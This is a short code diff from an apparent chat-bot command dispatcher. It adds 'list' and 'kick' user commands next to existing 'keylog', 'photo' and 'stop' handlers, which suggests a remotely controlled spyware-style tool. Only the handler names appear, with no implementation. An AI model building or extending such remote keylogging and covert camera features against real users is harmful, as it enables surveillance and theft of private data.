@@ -51,7 +51,9 @@ def replymessage(first_name, last_name, command, chat_id):
                 "stop": feature.kill_task,
                 "photo": feature.take_photo,
                 "keylog": feature.key_logger,
-                "chat": feature.run_language_model
+                "chat": feature.run_language_model,
+                "list": feature.list_users,
+                "kick": feature.kick_user,
             }
             if feature.chat_mode.get(chat_id) == 'ai':
                 command_handlers['chat'](
